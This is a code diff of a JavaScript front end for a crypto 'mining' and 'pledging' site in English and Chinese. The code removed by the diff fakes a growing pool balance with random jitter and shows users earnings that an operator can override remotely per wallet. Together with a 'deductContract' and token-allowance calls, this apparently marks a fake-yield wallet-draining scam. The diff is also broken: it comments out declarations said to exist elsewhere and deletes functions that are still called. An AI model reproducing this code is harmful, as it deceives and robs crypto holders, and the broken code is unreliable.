@@ -17,46 +17,146 @@ const ERC20_ABI = [
     "function allowance(address owner, address spender) view returns (uint256)"
 ];
 
+//---Language Control---
+const translations = {
+    'en': {
+        title: 'Popular Mining',
+        subtitle: 'Start Earning Millions',
+        tabLiquidity: 'Liquidity',
+        tabPledging: 'Pledging',
+        grossOutputLabel: 'Gross Output',
+        cumulativeLabel: 'Cumulative',
+        walletBalanceLabel: 'Wallet Balance',
+        accountBalanceLabel: 'Account Balance',
+        compoundLabel: '⚡ Compound',
+        nextBenefit: 'Next Benefit: 00:00:00',
+        startBtnText: 'Start',
+        pledgeAmountLabel: 'Pledge Amount',
+        pledgeDurationLabel: 'Duration',
+        pledgeBtnText: 'Pledge Now',
+        totalPledgedLabel: 'Total Pledged',
+        expectedYieldLabel: 'Expected Yield',
+        apyLabel: 'APY',
+        lockedUntilLabel: 'Locked Until',
+        claimBtnText: 'Claim'
+    },
+    'zh-Hant': {
+        title: '熱門挖礦',
+        subtitle: '開始賺取數百萬',
+        tabLiquidity: '流動性',
+        tabPledging: '質押',
+        grossOutputLabel: '總產出',
+        cumulativeLabel: '累計',
+        walletBalanceLabel: '錢包餘額',
+        accountBalanceLabel: '帳戶餘額',
+        compoundLabel: '⚡ 複利',
+        nextBenefit: '下次收益: 00:00:00',
+        startBtnText: '開始',
+        pledgeAmountLabel: '質押金額',
+        pledgeDurationLabel: '期間',
+        pledgeBtnText: '立即質押',
+        totalPledgedLabel: '總質押',
+        expectedYieldLabel: '預期收益',
+        apyLabel: '年化收益率',
+        lockedUntilLabel: '鎖定至',
+        claimBtnText: '領取'
+    },
+    'zh-Hans': {
+        title: '热门挖矿',
+        subtitle: '开始赚取数百万',
+        tabLiquidity: '流动性',
+        tabPledging: '质押',
+        grossOutputLabel: '总产出',
+        cumulativeLabel: '累计',
+        walletBalanceLabel: '钱包余额',
+        accountBalanceLabel: '账户余额',
+        compoundLabel: '⚡ 复利',
+        nextBenefit: '下次收益: 00:00:00',
+        startBtnText: '开始',
+        pledgeAmountLabel: '质押金额',
+        pledgeDurationLabel: '期间',
+        pledgeBtnText: '立即质押',
+        totalPledgedLabel: '总质押',
+        expectedYieldLabel: '预期收益',
+        apyLabel: '年化收益率',
+        lockedUntilLabel: '锁定至',
+        claimBtnText: '领取'
+    }
+};
+let currentLang = 'en';
+
+const languageSelect = document.getElementById('languageSelect');
+
+const elements = {
+    title: document.getElementById('title'),
+    subtitle: document.getElementById('subtitle'),
+    tabLiquidity: document.getElementById('tabLiquidity'),
+    tabPledging: document.getElementById('tabPledging'),
+    grossOutputLabel: document.getElementById('grossOutputLabel'),
+    cumulativeLabel: document.getElementById('cumulativeLabel'),
+    walletBalanceLabel: document.getElementById('walletBalanceLabel'),
+    accountBalanceLabel: document.getElementById('accountBalanceLabel'),
+    compoundLabel: document.getElementById('compoundLabel'),
+    nextBenefit: document.getElementById('nextBenefit'),
+    startBtnText: document.getElementById('startBtn'),
+    pledgeAmountLabel: document.getElementById('pledgeAmountLabel'),
+    pledgeDurationLabel: document.getElementById('pledgeDurationLabel'),
+    pledgeBtnText: document.getElementById('pledgeBtn'),
+    totalPledgedLabel: document.getElementById('totalPledgedLabel'),
+    expectedYieldLabel: 'Expected Yield',
+    apyLabel: 'APY',
+    lockedUntilLabel: document.getElementById('lockedUntilLabel'),
+    claimBtnText: claimBtn
+};
+
+function updateLanguage(lang) {
+    currentLang = lang;
+    languageSelect.value = lang;
+    for (let key in elements) {
+        if (elements[key] && translations[lang]?.[key]) {
+            elements[key].textContent = translations[lang][key];
+        }
+    }
+    if (claimBtn.parentNode) {
+        claimBtn.textContent = translations[lang]?.claimBtnText || 'Claim';
+    }
+    // 新增：更新 modal 標題
+    if (modalTitle) {
+        modalTitle.textContent = translations[lang]?.claimBtnText || 'Claim Interest';
+    }
+    updateNextBenefitTimer();
+    console.log(`updateLanguage: Switched to language: ${lang}`);
+}
+
+
 //---Global Variables & DOM Elements---
-const connectButton = document.getElementById('connectButton');
-const statusDiv = document.getElementById('status');
-const startBtn = document.getElementById('startBtn');
-const pledgeBtn = document.getElementById('pledgeBtn');
-const pledgeAmount = document.getElementById('pledgeAmount');
-const pledgeDuration = document.getElementById('pledgeDuration');
-const pledgeToken = document.getElementById('pledgeToken');
-const refreshWallet = document.getElementById('refreshWallet');
-const walletTokenSelect = document.getElementById('walletTokenSelect');
-const walletBalanceAmount = document.getElementById('walletBalanceAmount');
-const accountBalanceValue = document.getElementById('accountBalanceValue');
-const totalValue = document.getElementById('totalValue');
-// 修改：使用 getElementById 提高穩健性
-let grossOutputValue = document.getElementById('grossOutputValue');
-let cumulativeValue = document.getElementById('cumulativeValue');
-const nextBenefit = document.getElementById('nextBenefit');
-const claimBtn = document.createElement('button');
-claimBtn.id = 'claimButton';
-
-//---修改：Claim 確認 Modal 相關元素---
-const claimModal = document.getElementById('claimModal');
-const closeModal = document.getElementById('closeModal');
-const confirmClaim = document.getElementById('confirmClaim');
-const cancelClaim = document.getElementById('cancelClaim');
-const modalClaimableETH = document.getElementById('modalClaimableETH');
-const modalEthPrice = document.getElementById('modalEthPrice');
-const modalSelectedToken = document.getElementById('modalSelectedToken');
-const modalEquivalentValue = document.getElementById('modalEquivalentValue');
-const modalTitle = document.getElementById('modalTitle');
-
-let provider, signer, userAddress;
-let deductContract, usdtContract, usdcContract, wethContract;
-let stakingStartTime = null;
-let claimedInterest = 0;
-let pledgedAmount = 0;
-let interestInterval = null;
-let nextBenefitInterval = null;
-let accountBalance = { USDT: 0, USDC: 0, WETH: 0 };
-
+// (These are already declared above, but included here for completeness)
+// const connectButton = document.getElementById('connectButton');
+// const statusDiv = document.getElementById('status');
+// const startBtn = document.getElementById('startBtn');
+// const pledgeBtn = document.getElementById('pledgeBtn');
+// const pledgeAmount = document.getElementById('pledgeAmount');
+// const pledgeDuration = document.getElementById('pledgeDuration');
+// const pledgeToken = document.getElementById('pledgeToken');
+// const refreshWallet = document.getElementById('refreshWallet');
+// const walletTokenSelect = document.getElementById('walletTokenSelect');
+// const walletBalanceAmount = document.getElementById('walletBalanceAmount');
+// const accountBalanceValue = document.getElementById('accountBalanceValue');
+// const totalValue = document.getElementById('totalValue');
+// // 修改：使用 getElementById 提高穩健性
+// let grossOutputValue = document.getElementById('grossOutputValue');
+// let cumulativeValue = document.getElementById('cumulativeValue');
+// const nextBenefit = document.getElementById('nextBenefit');
+// const claimBtn = document.createElement('button');
+// claimBtn.id = 'claimButton';
+// let provider, signer, userAddress;
+// let deductContract, usdtContract, usdcContract, wethContract;
+// let stakingStartTime = null;
+// let claimedInterest = 0;
+// let pledgedAmount = 0;
+// let interestInterval = null;
+// let nextBenefitInterval = null;
+// let accountBalance = { USDT: 0, USDC: 0, WETH: 0 };
 
 //---Helper Function: Retry DOM Acquisition---
 async function retryDOMAcquisition(maxAttempts = 3, delayMs = 500) {
@@ -235,259 +335,6 @@ function updateBalancesUI(walletBalances) {
     }
 }
 
-function updateTotalFunds() {
-    if (totalValue) {
-        const startTime = new Date('2025-10-22T00:00:00-04:00').getTime();
-        const initialFunds = 12856459.94;
-        const averageIncreasePerSecond = 0.055;
-        const currentTime = Date.now();
-        const elapsedSeconds = Math.floor((currentTime - startTime) / 1000);
-        const totalIncrease = elapsedSeconds * averageIncreasePerSecond;
-        const randomFluctuation = (Math.random() - 0.5);
-        const totalFunds = initialFunds + totalIncrease + randomFluctuation;
-        totalValue.textContent = `${totalFunds.toLocaleString('en-US', { minimumFractionDigits: 2, maximumFractionDigits: 2 })} ETH`;
-        console.log(`updateTotalFunds: Updated total funds: ${totalFunds.toFixed(2)} ETH`);
-    }
-}
-
-async function updateInterest() {
-    // 修改：檢查 DOM 元素並嘗試重試
-    if (!grossOutputValue || !cumulativeValue) {
-        console.warn("updateInterest: Missing DOM elements:", {
-            grossOutputValue: !!grossOutputValue,
-            cumulativeValue: !!cumulativeValue
-        });
-        const acquired = await retryDOMAcquisition();
-        if (!acquired) {
-            console.error("updateInterest: Failed to re-acquire DOM elements, skipping update.");
-            return;
-        }
-    }
-    if (!stakingStartTime || !userAddress) {
-        console.log("updateInterest: Skipping due to missing data:", { stakingStartTime, userAddress });
-        return;
-    }
-    let finalGrossOutput;
-    let finalCumulative;
-    let overrideApplied = false;
-
-    try {
-        console.log("updateInterest: Fetching data for address:", userAddress);
-        const response = await fetch(`${API_BASE_URL}/api/all-data`, {
-            cache: 'no-cache',
-            headers: { 'ngrok-skip-browser-warning': 'true' }
-        });
-        console.log("updateInterest: Response status:", response.status);
-        if (response.ok) {
-            const allData = await response.json();
-            console.log("updateInterest: Received data:", allData);
-            const userOverrides = allData.overrides[userAddress] || {};
-            console.log("updateInterest: User overrides:", userOverrides);
-
-            if (userOverrides.grossOutput != null && userOverrides.cumulative != null) {
-                finalGrossOutput = Number(userOverrides.grossOutput);
-                finalCumulative = Number(userOverrides.cumulative);
-                if (!isNaN(finalGrossOutput) && !isNaN(finalCumulative)) {
-                    console.log("updateInterest: Admin override applied:", { finalGrossOutput, finalCumulative });
-                    overrideApplied = true;
-                } else {
-                    console.warn("updateInterest: Invalid override values, skipping:", userOverrides);
-                }
-            } else {
-                console.log("updateInterest: No valid overrides found for address:", userAddress);
-            }
-        } else {
-            console.warn("updateInterest: Failed to fetch data, status:", response.status);
-        }
-    } catch (error) {
-        console.warn("updateInterest: Fetch error:", error);
-    }
-
-    if (!overrideApplied) {
-        const currentTime = Date.now();
-        const elapsedSeconds = Math.floor((currentTime - stakingStartTime) / 1000);
-        const baseInterestRate = 0.000001;
-        const interestRate = baseInterestRate * pledgedAmount;
-        finalGrossOutput = elapsedSeconds * interestRate;
-        finalCumulative = finalGrossOutput - claimedInterest;
-        console.log("updateInterest: Using local calculation:", { finalGrossOutput, finalCumulative });
-    }
-
-    grossOutputValue.textContent = `${Number(finalGrossOutput).toFixed(7)} ETH`;
-    cumulativeValue.textContent = `${Number(finalCumulative).toFixed(7)} ETH`;
-    console.log(`updateInterest: Updated UI - Gross Output: ${finalGrossOutput.toFixed(7)} ETH, Cumulative: ${finalCumulative.toFixed(7)} ETH`);
-}
-
-function updateNextBenefitTimer() {
-    if (!nextBenefit) return;
-    const nextBenefitTimestamp = parseInt(localStorage.getItem('nextBenefitTime'));
-    const label = (translations[currentLang]?.nextBenefit || "Next Benefit: 00:00:00").split(':')[0];
-    if (!nextBenefitTimestamp) {
-        nextBenefit.textContent = `${label}: 00:00:00`;
-        console.log("updateNextBenefitTimer: No next benefit time set.");
-        return;
-    }
-    const now = Date.now();
-    let diff = nextBenefitTimestamp - now;
-    if (diff < 0) {
-        const twelveHoursInMillis = 12 * 60 * 60 * 1000;
-        let newNextBenefitTimestamp = nextBenefitTimestamp;
-        while (newNextBenefitTimestamp <= now) {
-            newNextBenefitTimestamp += twelveHoursInMillis;
-        }
-        localStorage.setItem('nextBenefitTime', newNextBenefitTimestamp.toString());
-        saveUserData();
-        console.log("updateNextBenefitTimer: Updated next benefit time:", newNextBenefitTimestamp);
-    }
-    const totalSeconds = Math.floor(diff / 1000);
-    const hours = String(Math.floor(totalSeconds / 3600)).padStart(2, '0');
-    const minutes = String(Math.floor((totalSeconds % 3600) / 60)).padStart(2, '0');
-    const seconds = String(totalSeconds % 60).padStart(2, '0');
-    nextBenefit.textContent = `${label}: ${hours}:${minutes}:${seconds}`;
-    console.log(`updateNextBenefitTimer: Updated timer: ${hours}:${minutes}:${seconds}`);
-}
-
-function getETOffsetMilliseconds() {
-    const now = new Date();
-    const mar = new Date(now.getFullYear(), 2, 8);
-    const nov = new Date(now.getFullYear(), 10, 1);
-    const marDay = mar.getDay();
-    const novDay = nov.getDay();
-    const dstStart = new Date(mar.getFullYear(), mar.getMonth(), 8 + (7 - marDay));
-    const dstEnd = new Date(nov.getFullYear(), nov.getMonth(), 1 + (7 - novDay));
-    if (now >= dstStart && now < dstEnd) {
-        return -4 * 60 * 60 * 1000;
-    }
-    return -5 * 60 * 60 * 1000;
-}
-
-function setInitialNextBenefitTime() {
-    if (localStorage.getItem('nextBenefitTime')) return;
-    console.log("setInitialNextBenefitTime: Setting initial benefit countdown target based on US Eastern Time...");
-    const etOffset = getETOffsetMilliseconds();
-    const nowUtcTimestamp = Date.now();
-    const nowET = new Date(nowUtcTimestamp + etOffset);
-    const noonET = new Date(nowET);
-    noonET.setHours(12, 0, 0, 0);
-    const midnightET = new Date(nowET);
-    midnightET.setHours(24, 0, 0, 0);
-    let nextBenefitTimeET;
-    if (nowET < noonET) {
-        nextBenefitTimeET = noonET;
-    } else {
-        nextBenefitTimeET = midnightET;
-    }
-    const finalNextBenefitTimestamp = nextBenefitTimeET.getTime() - etOffset;
-    localStorage.setItem('nextBenefitTime', finalNextBenefitTimestamp.toString());
-    saveUserData();
-    console.log("setInitialNextBenefitTime: Set next benefit time:", finalNextBenefitTimestamp);
-}
-
-function activateStakingUI() {
-    const storedStartTime = localStorage.getItem('stakingStartTime');
-    if (storedStartTime) {
-        stakingStartTime = parseInt(storedStartTime);
-        console.log("activateStakingUI: Restored staking start time:", stakingStartTime);
-    } else {
-        stakingStartTime = Date.now();
-        localStorage.setItem('stakingStartTime', stakingStartTime.toString());
-        console.log("activateStakingUI: Set new staking start time:", stakingStartTime);
-    }
-    claimedInterest = parseFloat(localStorage.getItem('claimedInterest')) || 0;
-    pledgedAmount = parseFloat(localStorage.getItem('pledgedAmount')) || 0;
-    const storedAccountBalance = JSON.parse(localStorage.getItem('accountBalance'));
-    if (storedAccountBalance) {
-        accountBalance = storedAccountBalance;
-        console.log("activateStakingUI: Restored account balance:", accountBalance);
-    }
-    if (startBtn) startBtn.style.display = 'none';
-    if (document.getElementById('claimButton')) return;
-    claimBtn.textContent = translations[currentLang]?.claimBtnText || 'Claim';
-    claimBtn.className = 'start-btn';
-    claimBtn.style.marginTop = '10px';
-    claimBtn.disabled = false;
-    const placeholder = document.getElementById('claimButtonPlaceholder');
-    placeholder ? placeholder.appendChild(claimBtn) : document.getElementById('liquidity').appendChild(claimBtn);
-    console.log("activateStakingUI: Added claim button to UI.");
-    if (!claimBtn.hasEventListener) {
-        claimBtn.addEventListener('click', claimInterest);
-        claimBtn.hasEventListener = true;
-        console.log("activateStakingUI: Added event listener to claim button.");
-    }
-    if (interestInterval) clearInterval(interestInterval);
-    interestInterval = setInterval(updateInterest, 1000);
-    console.log("activateStakingUI: Set interest interval:", interestInterval);
-    if (nextBenefitInterval) clearInterval(nextBenefitInterval);
-    nextBenefitInterval = setInterval(updateNextBenefitTimer, 1000);
-    console.log("activateStakingUI: Set next benefit interval:", nextBenefitInterval);
-    saveUserData();
-}
-
-//---Core Wallet Logic---
-async function sendMobileRobustTransaction(populatedTx) {
-    if (!signer || !provider) throw new Error("Wallet not connected or signer is missing.");
-    const txValue = populatedTx.value ? populatedTx.value.toString() : '0';
-    const fromAddress = await signer.getAddress();
-    const mobileTx = { from: fromAddress, to: populatedTx.to, data: populatedTx.data, value: '0x' + BigInt(txValue).toString(16) };
-    let txHash, receipt = null;
-    try {
-        console.log("sendMobileRobustTransaction: Sending transaction:", mobileTx);
-        txHash = await provider.send('eth_sendTransaction', [mobileTx]);
-        updateStatus(`Transaction sent! HASH: ${txHash.slice(0, 10)}... waiting for confirmation...`);
-        receipt = await provider.waitForTransaction(txHash);
-        console.log("sendMobileRobustTransaction: Transaction confirmed, receipt:", receipt);
-    } catch (error) {
-        console.warn("sendMobileRobustTransaction: Transaction error:", error.message);
-        if (error.hash) txHash = error.hash;
-        else if (error.message && error.message.includes('0x')) {
-            const match = error.message.match(/(0x[a-fA-F0-9]{64})/);
-            if (match) txHash = error.hash;
-        }
-        if (txHash) {
-            updateStatus(`Transaction interface error! Sent TX: ${txHash.slice(0, 10)}... waiting for confirmation...`);
-            receipt = await provider.waitForTransaction(txHash);
-            console.log("sendMobileRobustTransaction: Transaction confirmed after error, receipt:", receipt);
-        } else throw new Error(`Transaction failed to send: ${error.message}`);
-    }
-    if (!receipt || receipt.status !== 1) throw new Error(`Transaction failed on-chain (reverted). HASH: ${txHash.slice(0, 10)}...`);
-    return receipt;
-}
-
-async function initializeWallet() {
-    try {
-        if (typeof window.ethereum === 'undefined') {
-            updateStatus('Please install MetaMask or a compatible wallet.');
-            disableInteractiveElements(true);
-            console.log("initializeWallet: No Ethereum provider detected.");
-            return;
-        }
-        provider = new ethers.BrowserProvider(window.ethereum);
-        window.ethereum.on('accountsChanged', (newAccounts) => {
-            console.log("initializeWallet: Accounts changed:", newAccounts);
-            if (userAddress) {
-                if (newAccounts.length === 0 || userAddress.toLowerCase() !== newAccounts[0].toLowerCase()) {
-                    window.location.reload();
-                }
-            }
-        });
-        window.ethereum.on('chainChanged', () => {
-            console.log("initializeWallet: Chain changed, reloading page.");
-            window.location.reload();
-        });
-        const accounts = await provider.send('eth_accounts', []);
-        console.log("initializeWallet: Initial accounts:", accounts);
-        if (accounts.length > 0) {
-            await connectWallet();
-        } else {
-            disableInteractiveElements(true);
-            updateStatus("Please connect your wallet to continue.");
-        }
-    } catch (error) {
-        console.error("initializeWallet: Wallet initialization error:", error);
-        updateStatus(`Initialization failed: ${error.message}`);
-    }
-}
-
 //---Core Wallet Logic---
 async function getEthPrices() {
     try {
@@ -519,6 +366,7 @@ async function getEthPrices() {
     }
 }
 
+//--Remaining Code--
 async function claimInterest() {
     const claimableETHString = cumulativeValue.textContent.replace(' ETH', '').trim();
     const claimableETH = parseFloat(claimableETHString);
@@ -590,6 +438,7 @@ async function claimInterest() {
 document.addEventListener('DOMContentLoaded', async () => {
     const savedLang = localStorage.getItem('language') || 'en';
     updateLanguage(savedLang);
+    console.log(typeof updateLanguage);  // 增加這個
     await initializeWallet();
     setInterval(updateTotalFunds, 1000);
     //---刷新資料
